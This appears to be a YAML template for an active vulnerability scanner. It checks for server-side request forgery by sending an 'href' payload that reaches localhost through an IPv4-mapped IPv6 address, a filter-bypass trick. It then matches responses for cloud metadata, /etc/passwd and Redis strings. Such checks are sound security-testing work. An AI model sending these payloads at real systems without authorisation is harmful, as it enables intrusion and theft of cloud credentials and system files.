id: ssrf2-050
name: 'SSRF2 bypass via href'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
  - bypass
description: 'SSRF filter bypass via href'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      href:
        - 'http://[0:0:0:0:0:ffff:127.0.0.1]/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
